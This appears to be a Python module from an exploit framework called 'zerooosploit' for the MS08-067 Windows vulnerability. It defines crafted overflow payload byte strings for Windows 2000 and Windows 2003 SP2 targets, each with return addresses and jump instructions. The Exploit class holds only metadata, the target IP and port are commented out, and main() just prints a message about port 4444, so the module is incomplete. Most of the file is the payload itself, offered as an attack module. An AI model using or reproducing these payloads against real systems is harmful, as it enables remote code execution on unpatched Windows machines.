'''
exp标准

'''

from zerooosploit import exploits
from zerooosploit import color

# Payload for Windows 2000 target
windows_2000 = '\x41\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00'
windows_2000 += '\x41\x41\x41\x41\x41\x41\x41\x41'
windows_2000 += '\x41\x41\x41\x41\x41\x41\x41\x41'
windows_2000 += '\x41\x41'
windows_2000 += '\x2f\x68\x18\x00\x8b\xc4\x66\x05\x94\x04\x8b\x00\xff\xe0'
windows_2000 += '\x43\x43\x43\x43\x43\x43\x43\x43'
windows_2000 += '\x43\x43\x43\x43\x43\x43\x43\x43'
windows_2000 += '\x43\x43\x43\x43\x43\x43\x43\x43'
windows_2000 += '\x43\x43\x43\x43\x43\x43\x43\x43'
windows_2000 += '\x43\x43\x43\x43\x43\x43\x43\x43'
windows_2000 += '\xeb\xcc'
windows_2000 += '\x00\x00'

# Payload for Windows 2003[SP2] target
windows_2003_sp2 = '\x41\x00\x5c\x00'
windows_2003_sp2 += '\x2e\x00\x2e\x00\x5c\x00\x2e\x00'
windows_2003_sp2 += '\x2e\x00\x5c\x00\x0a\x32\xbb\x77'
windows_2003_sp2 += '\x8b\xc4\x66\x05\x60\x04\x8b\x00'
windows_2003_sp2 += '\x50\xff\xd6\xff\xe0\x42\x84\xae'
windows_2003_sp2 += '\xbb\x77\xff\xff\xff\xff\x01\x00'
windows_2003_sp2 += '\x01\x00\x01\x00\x01\x00\x43\x43'
windows_2003_sp2 += '\x43\x43\x37\x48\xbb\x77\xf5\xff'
windows_2003_sp2 += '\xff\xff\xd1\x29\xbc\x77\xf4\x75'
windows_2003_sp2 += '\xbd\x77\x44\x44\x44\x44\x9e\xf5'
windows_2003_sp2 += '\xbb\x77\x54\x13\xbf\x77\x37\xc6'
windows_2003_sp2 += '\xba\x77\xf9\x75\xbd\x77\x00\x00'


class Exploit(exploits.ExploitAggregate):
    """
    MS08-067 Exploit by Debasis Mohanty (aka Tr0y/nopsled)
    """
    __info__ = {
        'name': 'MS08-067',
        'authors': 'd3basis.m0hanty @ gmail.com',
        'revise': '01 Security Team',
        'references': 'www.coffeeandsecurity.com',
        'cve': '',
    }


def main():
    print(color.success_tips('port open on 4444'))

    # targetip =
    # targetport =